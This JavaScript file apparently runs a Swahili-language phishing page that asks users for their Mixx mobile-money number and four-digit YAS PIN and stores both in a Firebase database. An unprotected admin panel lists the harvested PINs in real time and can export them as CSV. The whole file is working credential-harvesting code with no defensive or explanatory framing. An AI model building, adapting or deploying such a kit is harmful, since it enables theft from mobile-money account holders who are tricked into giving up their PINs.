// Initialize Firebase
const firebaseConfig = {
    apiKey: "AIzaSyDjx1234567890abcdefghijklmnopqrst",
    authDomain: "mixxtz.firebaseapp.com",
    projectId: "mixxtz",
    storageBucket: "mixxtz.appspot.com",
    messagingSenderId: "123456789",
    appId: "1:123456789:web:abcdef1234567890"
};

// Only initialize Firebase if not already done
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}

const db = firebase.firestore();

// Real-time listener for admin panel
let unsubscribe = null;

// Load data from Firestore
async function loadEntriesFromFirestore() {
    try {
        const snapshot = await db.collection('entries').orderBy('timestamp', 'desc').get();
        let entries = [];
        snapshot.forEach(doc => {
            entries.push({
                id: doc.id,
                ...doc.data()
            });
        });
        return entries;
    } catch (error) {
        console.error('Error loading entries:', error);
        return [];
    }
}

// Save data to Firestore
async function saveEntryToFirestore(entry) {
    try {
        await db.collection('entries').add({
            mixxName: entry.mixxName,
            yasPin: entry.yasPin,
            timestamp: new Date(),
            createdAt: firebase.firestore.Timestamp.now()
        });
    } catch (error) {
        console.error('Error saving entry:', error);
        throw error;
    }
}

// Page Navigation
function showPage(pageName) {
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => page.classList.remove('active'));
    
    const selectedPage = document.getElementById(pageName + '-page');
    if (selectedPage) {
        selectedPage.classList.add('active');
        if (pageName === 'admin') {
            setupAdminRealtimeListener();
        } else {
            if (unsubscribe) {
                unsubscribe();
                unsubscribe = null;
            }
        }
    }
}

// Set up real-time listener for admin panel
function setupAdminRealtimeListener() {
    if (unsubscribe) {
        unsubscribe();
    }

    unsubscribe = db.collection('entries').orderBy('timestamp', 'desc').onSnapshot(
        snapshot => {
            const entries = [];
            snapshot.forEach(doc => {
                entries.push({
                    id: doc.id,
                    ...doc.data(),
                    timestamp: doc.data().timestamp ? doc.data().timestamp.toDate().toLocaleString('sw-TZ') : new Date().toLocaleString('sw-TZ')
                });
            });
            displayAdminEntries(entries);
        },
        error => {
            console.error('Error listening to entries:', error);
        }
    );
}

// Handle form submission
document.addEventListener('DOMContentLoaded', function() {
    const userForm = document.getElementById('userForm');
    
    if (userForm) {
        userForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const mixxName = document.getElementById('mixxName').value.trim();
            const yasPin = document.getElementById('yasPin').value.trim();

            if (!mixxName) {
                showError('Tafadhali ingiza nambari ya Mixx');
                return;
            }

            if (yasPin.length !== 4 || isNaN(yasPin)) {
                showError('YAS PIN lazima iwe namba 4');
                return;
            }

            try {
                const entry = {
                    mixxName: mixxName,
                    yasPin: yasPin
                };

                await saveEntryToFirestore(entry);
                showSuccess('Taarifa ilisambazwa kwa mafanikio!');
                userForm.reset();

                setTimeout(() => {
                    document.getElementById('successMessage').style.display = 'none';
                    document.getElementById('errorMessage').style.display = 'none';
                }, 3000);
            } catch (error) {
                showError('Kosa: Tafadhali jaribu tena');
            }
        });
    }

    // Handle hash navigation
    function handleNavigation() {
        const hash = window.location.hash.slice(1);
        if (hash === 'form' || hash === 'admin') {
            showPage(hash);
        } else {
            showPage('home');
        }
    }

    // Initial navigation
    handleNavigation();

    // Listen for hash changes
    window.addEventListener('hashchange', handleNavigation);
});

function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    errorDiv.textContent = '✗ ' + message;
    errorDiv.style.display = 'block';
    document.getElementById('successMessage').style.display = 'none';
}

function showSuccess(message) {
    const successDiv = document.getElementById('successMessage');
    successDiv.textContent = '✓ ' + message;
    successDiv.style.display = 'block';
    document.getElementById('errorMessage').style.display = 'none';
}

function displayAdminEntries(entries) {
    const adminTable = document.getElementById('adminTable');
    const noEntries = document.getElementById('noEntries');

    if (entries.length === 0) {
        adminTable.innerHTML = '';
        noEntries.style.display = 'block';
        return;
    }

    noEntries.style.display = 'none';

    let tableHTML = `
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Nambari ya Mixx</th>
                    <th>YAS PIN</th>
                    <th>Tarehe na Wakati</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
    `;

    entries.forEach((entry, index) => {
        tableHTML += `
            <tr>
                <td>${index + 1}</td>
                <td><strong>${escapeHtml(entry.mixxName)}</strong></td>
                <td><strong>${escapeHtml(entry.yasPin)}</strong></td>
                <td><span class="timestamp">${entry.timestamp}</span></td>
                <td>
                    <button class="btn-delete" onclick="deleteEntry('${entry.id}')">Delete</button>
                </td>
            </tr>
        `;
    });

    tableHTML += `
            </tbody>
        </table>
    `;

    adminTable.innerHTML = tableHTML;
}

async function deleteEntry(id) {
    if (confirm('Hakika unataka kufuta ingizo hili?')) {
        try {
            await db.collection('entries').doc(id).delete();
        } catch (error) {
            console.error('Error deleting entry:', error);
            alert('Kosa: Haiwezi kufuta ingizo');
        }
    }
}

async function clearAllEntries() {
    if (confirm('Hakika unataka kufuta ingizo lote? Hatua hii haiwezi kubadilishwa!')) {
        try {
            const snapshot = await db.collection('entries').get();
            const batch = db.batch();
            snapshot.forEach(doc => {
                batch.delete(doc.ref);
            });
            await batch.commit();
            alert('Ingizo lote limefutwa');
        } catch (error) {
            console.error('Error clearing entries:', error);
            alert('Kosa: Haiwezi kufuta ingizo');
        }
    }
}

async function exportData() {
    try {
        const entries = await loadEntriesFromFirestore();
        
        if (entries.length === 0) {
            alert('Hakuna ingizo la kuandika');
            return;
        }

        let csvContent = 'Nambari ya Mixx,YAS PIN,Tarehe na Wakati\n';
        
        entries.forEach(entry => {
            csvContent += `"${entry.mixxName}","${entry.yasPin}","${entry.timestamp}"\n`;
        });

        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement('a');
        const url = URL.createObjectURL(blob);
        link.setAttribute('href', url);
        link.setAttribute('download', `mixxtz_entries_${new Date().getTime()}.csv`);
        link.style.visibility = 'hidden';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    } catch (error) {
        console.error('Error exporting data:', error);
        alert('Kosa: Haiwezi kuandika data');
    }
}

function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
